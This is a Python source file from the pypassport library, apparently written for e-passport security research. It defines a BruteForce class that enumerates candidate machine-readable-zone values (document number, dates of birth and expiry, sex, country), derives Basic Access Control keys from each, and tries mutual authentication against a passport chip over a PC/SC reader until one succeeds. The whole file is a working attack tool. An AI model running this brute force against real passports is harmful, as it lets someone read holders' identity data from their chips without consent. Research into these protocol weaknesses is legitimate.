# Copyright 2012 Antonin Beaujeant
#
# This file is part of pypassport.
#
# pypassport is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# pypassport is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with pyPassport.
# If not, see <http://www.gnu.org/licenses/>.

import os
import time
import datetime
import re
from hashlib import sha1
from Crypto.Cipher import DES3
from Crypto.Cipher import DES

from pypassport.logger import Logger
from pypassport.iso7816 import Iso7816, Iso7816Exception 
from pypassport.iso9797 import *
from pypassport.doc9303.bac import BAC
from pypassport.reader import PcscReader, ReaderException
from pypassport.doc9303.mrz import MRZ
from pypassport import apdu
from pypassport.hexfunctions import hexToHexRep, binToHexRep

class BruteForceException(Exception):
    def __init__(self, *params):
        Exception.__init__(self, *params)

class BruteForce(Logger):
    """
    This class performs a brute force attack against the BAC process based on a range of MRZ
    The main method is I{exploit}: it test every combination of MRZ in the range set by the user.
    """
    
    KENC= '\0\0\0\1'
    KMAC= '\0\0\0\2'
    
    def __init__(self, iso7816):
        Logger.__init__(self, "BRUTE FORCE")
        self._iso7816 = iso7816
        
        if type(self._iso7816) != type(Iso7816(None)):
            raise MacTraceabilityException("The sublayer iso7816 is not available")

        if self._iso7816.getTypeReader() != type(PcscReader()):
            raise MacTraceabilityException("The reader must be a PcscReader for this attack")
        
        # Select the passport application using the AID A0000002471001
        self._iso7816.selectFile("04", "0C", "A0000002471001")

        self._bac = BAC(iso7816)
        
        self._id_low = None
        self._id_high = None
        self._country = None
        self._dob_low = None
        self._dob_high = None
        self._exp_date_low = None
        self._exp_date_high = None
        self._sex = None
        self._pers_num_low = None
        self._pers_num_high = None
        
        self._sexes = ['M', 'F']
        self._weighting = [7,3,1]
        self._id_values = {'<':0, '0':0, '1':1, '2':2, '3':3, '4':4, '5':5, '6':6, '7':7, '8':8, '9':9, 'A':10, 'B':11, 'C':12, 'D':13, 'E':14, 'F':15, 'G':16, 'H':17, 'I':18, 'J':19, 'K':20, 'L':21, 'M':22, 'N':23, 'O':24, 'P':25, 'Q':26, 'R':27, 'S':28, 'T':29, 'U':30, 'V':31, 'W':32, 'X':33, 'Y':34, 'Z':35}
        self._inv_id_values = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        self.country_value = ['BEL', 'FRA', 'GBR']
    
    def setID(self, low=None, high=None):
        if low==None: low = "0"

        if high==None:
            if low=="0": high = "ZZZZZZZZZ"
            else: high = low

        self._id_low = low
        self._id_high = high
        
        if high:
            (value_low, value_high) = self._weightValue(self._id_low, self._id_high)
            if value_low > value_high:
                (self._id_high, self._id_low) = (self._id_low, self._id_high)
    
    def setCountry(self, country=None):
        self._country = country
    
    def setDOB(self, low=None, high=None):
        today = datetime.date.today()

        if high==None:
            if low==None: high = today.strftime("%Y/%m/%d")
            else: high = None
        
        if low==None:
            low_date = datetime.date(today.year-100, today.month, today.day)
            low = low_date.strftime("%Y/%m/%d")

        date_cmp = low.split("/")
        self._dob_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        if high:
            date_cmp = high.split("/")
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        else:
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        
        if self._dob_low > self._dob_high:
            (self._dob_high, self._dob_low) = (self._dob_low, self._dob_high)

    def setSex(self, sex=None):
        self._sex = sex
    
    def setExpDate(self, low=None, high=None):
        today = datetime.date.today()

        if low==None:
            if high==None:
                low_date = datetime.date(today.year-10, today.month, today.day)
                low = low_date.strftime("%Y/%m/%d")
            else:
                low_date = datetime.date(int(high[:4])-10, int(high[5:7]), int(high[8:10]))
                low = low_date.strftime("%Y/%m/%d")

        if high==None:
            if low==None: 
                high_date = datetime.date(today.year+10, today.month, today.day)
                high = high_date.strftime("%Y/%m/%d")
            else: high = low

        date_cmp = low.split("/")
        self._exp_date_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        date_cmp = high.split("/")
        self._exp_date_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        
        if self._exp_date_low > self._exp_date_high:
            (self._exp_date_high, self._exp_date_low) = (self._exp_date_low, self._exp_date_high)
    
    def setPersonalNumber(self, low=None, high=None):
        if low==None:
            low = "<"
            if high==None:
                high = low

        self._pers_num_low = low
        self._pers_num_high = high
        
        (value_low, value_high) = self._weightValue(self._pers_num_low, self._pers_num_high)
        if value_low > value_high:
            (self._pers_num_high, self._pers_num_low) = (self._pers_num_low, self._pers_num_high)

    def _check(self):
        check = True

        pattern_id = '^[0-9A-Z<]{8,9}$'
        reg=re.compile(pattern_id)
        if not reg.match(self._id_low): check = False
        if self._id_high:
            if not reg.match(self._id_high): check = False
        
        if type(self._dob_low)!=type(datetime.date.today()): check = False
        if self._dob_high:
            if type(self._dob_high)!=type(datetime.date.today()): check = False
        if type(self._exp_date_low)!=type(datetime.date.today()): check = False
        if self._exp_date_high:
            if type(self._exp_date_high)!=type(datetime.date.today()): check = False
        
        if self._sex:
            if not self._sex in self._sexes: check = False
        
        if self._country:
            if not self._country in self.country_value: check = False
        
        reg=re.compile(pattern_id)
        if not reg.match(self._pers_num_low): check = False
        if self._pers_num_high:
            if not reg.match(self._pers_num_high): check = False
        
        return check
    
    def getIdStat(self):
        (value_low, value_high) = self._weightValue(self._id_low, self._id_high)
        entropy = value_high - value_low + 1
        return (self._id_low, self._id_high, entropy)

    def getCountryStat(self):
        entropy = 1
        if not self._country:
            entropy = len(self.country_value)
        
        return (self._country, entropy)
    
    def getDOBStat(self):
        delta = self._dob_high - self._dob_low
        entropy = delta.days + 1
        return (self._dob_low, self._dob_high, entropy)

    def getSexStat(self):
        entropy = 1
        if not self._sex:
            entropy = 2
        
        return (self._sex, entropy)

    def getExpDateStat(self):
        delta = self._exp_date_high - self._exp_date_low
        entropy = delta.days + 1
        return (self._exp_date_low, self._exp_date_high, entropy)
    
    def getPersonalNumberStat(self):
        (value_low, value_high) = self._weightValue(self._pers_num_low, self._pers_num_high)
        entropy = value_high - value_low + 1

        return (self._pers_num_low, self._pers_num_high, entropy)
    
    def _weightValue(self, low, high):
        
        len_low = len(low)
        if high:
            len_high = len(high)
        else:
            len_high = 0   
        
        value_low = 0
        value_high = 0
        i = 1
        while i <= len_low:
            value_low += self._id_values[low[-i]]*pow(36, i-1)
            i += 1

        i = 1
        while i <= len_high:
            value_high += self._id_values[high[-i]]*pow(36, i-1)
            i += 1

        return (value_low, value_high)
    
    def _calculCheckDigit(self, value):
        """ Create check digit for a value of the MRZ 
        
            @param value: initial value
            @type value: String
            @return: Check digit
            @rtype: String
            
            @note: Code fragment from the pyPassport.mrz.MRZ class
        """
        cpt=0
        res=0
        for x in value:
            tmp = self._id_values[str(x)] * self._weighting[cpt%3]
            res += tmp
            cpt += 1
        return str(res%10)
    
    def _buildMRZ(self, id_pass, country, dob, sex, exp, pers_num):
        id_pass_full = id_pass + (9-len(id_pass))*'<' + self._calculCheckDigit(id_pass)
        dob_full = dob + self._calculCheckDigit(dob)
        exp_full = exp + self._calculCheckDigit(exp)
        pers_num_full = pers_num + (14-len(pers_num))*'<' + self._calculCheckDigit(pers_num)
        return id_pass_full + country + dob_full + sex + exp_full + pers_num_full + self._calculCheckDigit(id_pass_full+dob_full+exp_full+pers_num_full)
    
    def _nextIdValue(self, value):
        len_value = len(value)
        dec_value = 0
        new_value = ""

        i = 1
        while i <= len_value:
            dec_value += self._id_values[value[-i]]*pow(36, i-1)
            i += 1
        dec_value += 1
        
        while dec_value:
            new_value = self._inv_id_values[dec_value % 36] + new_value
            dec_value //= 36
        
        return new_value

    def exploit(self):
        found = False
        cur_id = self._id_low
        max_id = self._id_high

        if self._country:
            i = 0
            while i < len(self.country_value):
                if self.country_value[i] == self._country:
                    break
                i += 1
            pos_country = i
            max_pos_country = i
        else:
            pos_country = 0
            max_pos_country = len(self.country_value)-1

        if self._sex:
            i = 0
            while i < 2:
                if self._sexes[i] == self._sex:
                    break
                i += 1
            pos_sex = i
            max_pos_sex = i
        else:
            pos_sex = 0
            max_pos_sex = 1
        
        starttime = time.time()
        while not found:
            
            cur_country = pos_country
            while not found:
                
                cur_dob = self._dob_low
                max_dob = self._dob_high
                while not found:
                    
                    cur_sex = pos_sex
                    while not found:
                        
                        cur_exp = self._exp_date_low
                        max_exp = self._exp_date_high
                        while not found:
                            
                            cur_num = self._pers_num_low
                            if self._pers_num_high:
                                max_num = self._pers_num_high
                            else:
                                max_num = self._pers_num_low
                            while not found:
                                
                                print self._buildMRZ(cur_id, self.country_value[cur_country], cur_dob.strftime("%y%m%d"), self._sexes[cur_sex], cur_exp.strftime("%y%m%d"), cur_num)
                                kmrz = cur_id + (9-len(cur_id))*'<' + self._calculCheckDigit(cur_id) + cur_dob.strftime("%y%m%d") + self._calculCheckDigit(cur_dob.strftime("%y%m%d")) + cur_exp.strftime("%y%m%d") + self._calculCheckDigit(cur_exp.strftime("%y%m%d"))
                                kseed = self._genKseed(kmrz)
                                kenc = self.keyDerivation(kseed, BruteForce.KENC)
                                kmac = self.keyDerivation(kseed, BruteForce.KMAC)
                                
                                rnd_icc = self._iso7816.getChallenge()

                                try:
                                    data = self.authentication(rnd_icc, kenc, kmac)
                                    found = True
                                except Iso7816Exception:
                                    self._iso7816.rstConnection()
                                    pass
                                
                                if cur_num == max_num:
                                    break
                                cur_num = self._nextIdValue(cur_num)
                            
                            if cur_exp == max_exp:
                                break
                            cur_exp += datetime.timedelta(1)
                        
                        if cur_sex == max_pos_sex:
                            break
                        cur_sex += 1

                    if cur_dob == max_dob:
                        break
                    cur_dob += datetime.timedelta(1)
                
                if cur_country == max_pos_country:
                    break
                cur_country += 1
            
            if cur_id == max_id:
                break
            cur_id = self._nextIdValue(cur_id)
            
        print found
        print time.time() - starttime
    
    def _genKseed(self, kmrz):
        kseedhash= sha1(str(kmrz))
        kseed = kseedhash.digest()
        return kseed[:16]
    
    def keyDerivation(self, kseed, c):
        d = kseed + c
        h = sha1(str(d)).digest()

        Ka = h[:8]
        Kb = h[8:16]
        
        Ka = self.DESParity(Ka)
        Kb = self.DESParity(Kb)

        return Ka+Kb
    
    def DESParity(self, data):
        adjusted= ''
        for x in range(len(data)):
            y= ord(data[x]) & 0xfe
            parity= 0
            for z in range(8):
                parity += y >>  z & 1
            adjusted += chr(y + (not parity % 2))
        return adjusted
    
    def authentication(self, rnd_icc, kenc, kmac):

        rnd_ifd = os.urandom(8)
        kifd = os.urandom(16)

        s = rnd_ifd + rnd_icc + kifd    

        tdes= DES3.new(kenc,DES.MODE_CBC)
        eifd= tdes.encrypt(s)
        
        mifd = mac(kmac, pad(eifd))
        
        cmd_data = eifd + mifd
        data = binToHexRep(cmd_data)
        lc = hexToHexRep(len(data)/2) 
        toSend = apdu.CommandAPDU("00", "82", "00", "00", lc, data, "28")

        return self._iso7816.transmit(toSend, "Mutual Authentication")










